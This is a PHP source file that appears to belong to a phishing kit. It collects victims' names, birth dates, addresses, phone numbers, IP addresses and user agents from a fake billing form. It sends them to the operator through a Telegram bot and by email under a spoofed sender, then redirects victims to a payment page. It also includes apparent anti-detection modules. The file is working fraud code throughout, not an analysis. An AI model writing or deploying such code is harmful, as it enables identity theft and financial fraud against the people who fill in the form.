<?php
session_start();
include('../email.php');
include('../PREVENTS/anti1.php');
include('../PREVENTS/anti2.php');
include('../PREVENTS/anti3.php');
include('../PREVENTS/anti4.php');
include('../PREVENTS/anti5.php');
include('../PREVENTS/anti6.php');
include('../PREVENTS/anti7.php');
include('../PREVENTS/anti8.php');


$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $_SESSION['nom'] = $_POST['confirmation_form']['lastName'];
    $_SESSION['prenom'] = $_POST['confirmation_form']['firstName'];
    $_SESSION['dob'] = $_POST['confirmation_form']['birthDate'];
    $_SESSION['adresse'] = $_POST['confirmation_form']['address'];
    $_SESSION['city'] = $_POST['confirmation_form']['city'];
    $_SESSION['zip'] = $_POST['confirmation_form']['zipCode'];
    $_SESSION['phone'] = $_POST['confirmation_form']['phone'];

    if (empty($_SESSION['nom']) || empty($_SESSION['prenom']) || empty($_SESSION['dob']) || empty($_SESSION['adresse']) || empty($_SESSION['city']) || empty($_SESSION['zip']) || empty($_SESSION['phone']) || strlen($_SESSION['phone']) != 10) {
        header('Location: billing.php?error=true&' . uniqid(rand(), true));
        exit;
    } else {
        if ($envoyerBillingEnUnRez == true) {
            $message = "
                🗃[INFORMATIONS PERSONNELLES]
🪪 Prénom : ".$_SESSION['prenom']."
🪪 Nom : ".$_SESSION['nom']."
🪪 Date de naissance : ".$_SESSION['dob']."
📬 Adresse : ".$_SESSION['adresse']."
📬 Ville : ".$_SESSION['city']."
📬 Code Postal : ".$_SESSION['zip']."
📞 Num : ".$_SESSION['phone']."

📀 IP ADRESS : ".$_SESSION['ip']."
📀 USER-AGENT : ".$_SESSION['useragent']."
            ";

            $subject = "=?utf-8?Q?=E3=80=8C=F0=9F=97=82=E3=80=8D=2B1_INFO?= - " . $_SESSION['ip'];
            $headers = "From: =?utf-8?Q?COBRA_x_KOUNT_=F0=9F=A5=9D?= <crusix@amzv1.com>";
            $data = [
                'text' => $message,
                'chat_id' => $chat_id
            ];
            file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
            mail($boite_rez, $subject, $message, $headers);
            header('Location: ../paiement.php');
            exit;
        } else {
            header('Location: ../paiement.php');
            exit;
        }
    }
}
?>
